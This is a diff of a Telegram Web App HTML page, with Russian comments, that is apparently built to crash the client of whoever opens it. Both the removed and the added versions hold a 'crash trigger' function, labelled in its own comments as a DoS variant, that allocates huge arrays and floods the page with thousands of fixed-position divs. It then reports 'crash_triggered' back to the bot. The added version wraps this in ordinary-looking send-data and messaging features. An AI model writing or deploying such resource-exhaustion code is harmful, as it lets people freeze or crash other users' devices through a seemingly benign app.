@@ -1,83 +1,227 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Web App</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Møɍƥɧ Web App</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body {
+        * {
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
             background: var(--tg-theme-bg-color);
             color: var(--tg-theme-text-color);
-            font-family: system-ui;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
         }
+        
         .container {
-            max-width: 600px;
+            max-width: 500px;
             margin: 0 auto;
+            padding: 20px;
         }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .card {
+            background: var(--tg-theme-secondary-bg-color);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+        
         button {
             width: 100%;
-            padding: 15px;
+            padding: 14px;
             margin: 10px 0;
-            background: var(--tg-theme-button-color);
-            color: var(--tg-theme-button-text-color);
             border: none;
             border-radius: 12px;
             font-size: 16px;
+            font-weight: 500;
             cursor: pointer;
+            transition: opacity 0.2s;
         }
-        .danger {
+        
+        button:active {
+            opacity: 0.7;
+        }
+        
+        .btn-primary {
+            background: var(--tg-theme-button-color);
+            color: var(--tg-theme-button-text-color);
+        }
+        
+        .btn-danger {
             background: #dc3545;
+            color: white;
+        }
+        
+        .btn-secondary {
+            background: var(--tg-theme-secondary-bg-color);
+            color: var(--tg-theme-text-color);
+            border: 1px solid var(--tg-theme-hint-color);
+        }
+        
+        .status {
+            margin-top: 15px;
+            padding: 12px;
+            background: rgba(0,0,0,0.1);
+            border-radius: 10px;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        input, textarea {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: var(--tg-theme-bg-color);
+            color: var(--tg-theme-text-color);
+            border: 1px solid var(--tg-theme-hint-color);
+            border-radius: 10px;
+            font-size: 14px;
+        }
+        
+        textarea {
+            min-height: 100px;
+            resize: vertical;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Talezoww crash App</h1>
-        <button id="crashBtn" class="danger">⚠️ ЗАПУСТИТЬ ПРОЦЕСС ⚠️</button>
-        <button id="closeBtn">Закрыть</button>
+        <h1>⚡ Møɍƥɧ Web App</h1>
+        
+        <div class="card">
+            <h3>Основные действия</h3>
+            <button class="btn-primary" id="sendDataBtn">📤 Отправить данные</button>
+            <button class="btn-danger" id="triggerBtn">⚠️ ЗАПУСТИТЬ ПРОЦЕСС</button>
+            <button class="btn-secondary" id="closeBtn">❌ Закрыть</button>
+        </div>
+        
+        <div class="card">
+            <h3>Отправить сообщение</h3>
+            <input type="text" id="messageInput" placeholder="Введите текст...">
+            <button class="btn-primary" id="sendMsgBtn">Отправить в Telegram</button>
+        </div>
+        
+        <div class="card">
+            <h3>Статус</h3>
+            <div class="status" id="status">Web App готов к работе</div>
+        </div>
     </div>
     
     <script>
+        // Инициализация Telegram Web App
         const tg = window.Telegram.WebApp;
         tg.ready();
-        tg.expand(); // На весь экран
+        tg.expand(); // Развернуть на весь экран
         
-        // Функция для нагрузки (вариант DoS)
-        function triggerPayload() {
-            // Массивная аллокация памяти
-            let arr = [];
-            for (let i = 0; i < 100; i++) {
-                arr.push(new Array(10000000).fill('X'));
+        const statusDiv = document.getElementById('status');
+        
+        // Обновление статуса
+        function updateStatus(text, isError = false) {
+            statusDiv.innerHTML = text;
+            statusDiv.style.background = isError ? 'rgba(220,53,69,0.2)' : 'rgba(0,0,0,0.1)';
+        }
+        
+        // Отправить данные боту
+        function sendToBot(data) {
+            try {
+                tg.sendData(JSON.stringify(data));
+                updateStatus(`✅ Отправлено: ${JSON.stringify(data)}`);
+            } catch(e) {
+                updateStatus(`❌ Ошибка: ${e.message}`, true);
             }
-            // Бесконечный рендеринг
-            setInterval(() => {
-                for (let i = 0; i < 1000; i++) {
-                    let div = document.createElement('div');
+        }
+        
+        // Основные кнопки
+        document.getElementById('sendDataBtn').onclick = () => {
+            sendToBot({
+                action: 'test',
+                timestamp: Date.now(),
+                user: tg.initDataUnsafe?.user?.id || 'unknown'
+            });
+        };
+        
+        // Функция нагрузки (краш-триггер)
+        function triggerCrash() {
+            updateStatus('⚠️ Запуск процесса...', false);
+            
+            // Вариант 1: Массивная аллокация памяти
+            let memoryHog = [];
+            for (let i = 0; i < 50; i++) {
+                memoryHog.push(new Array(5000000).fill('X'));
+            }
+            
+            // Вариант 2: Бесконечный рендеринг
+            let counter = 0;
+            const interval = setInterval(() => {
+                for (let i = 0; i < 500; i++) {
+                    const div = document.createElement('div');
                     div.style.position = 'fixed';
                     div.style.top = Math.random() * 10000 + 'px';
                     div.style.left = Math.random() * 10000 + 'px';
-                    div.style.width = '100px';
-                    div.style.height = '100px';
-                    div.style.background = 'red';
+                    div.style.width = '50px';
+                    div.style.height = '50px';
+                    div.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                    div.style.zIndex = 9999;
                     document.body.appendChild(div);
                 }
-            }, 10);
+                counter++;
+                if (counter > 1000) clearInterval(interval);
+            }, 1);
+            
+            // Отправка уведомления боту
+            sendToBot({
+                action: 'crash_triggered',
+                timestamp: Date.now()
+            });
         }
         
-        document.getElementById('crashBtn').onclick = () => {
-            tg.sendData(JSON.stringify({ action: 'crash', time: Date.now() }));
-            triggerPayload();
+        document.getElementById('triggerBtn').onclick = () => {
+            triggerCrash();
         };
         
         document.getElementById('closeBtn').onclick = () => {
             tg.close();
         };
         
-        // Автоматический триггер (если нужно)
-        // triggerPayload();
+        // Отправка сообщения
+        document.getElementById('sendMsgBtn').onclick = () => {
+            const msg = document.getElementById('messageInput').value;
+            if (msg.trim()) {
+                sendToBot({
+                    action: 'message',
+                    text: msg,
+                    timestamp: Date.now()
+                });
+                document.getElementById('messageInput').value = '';
+            } else {
+                updateStatus('Введите сообщение', true);
+            }
+        };
+        
+        // Обработка данных от бота (если бот отправляет обратно)
+        tg.onEvent('mainButtonClicked', () => {
+            updateStatus('Нажата главная кнопка');
+        });
+        
+        // Вывод информации о пользователе
+        if (tg.initDataUnsafe?.user) {
+            console.log('User:', tg.initDataUnsafe.user);
+            updateStatus(`👤 Привет, ${tg.initDataUnsafe.user.first_name || 'пользователь'}!`);
+        } else {
+            updateStatus('Web App запущен');
+        }
     </script>
 </body>
 </html>
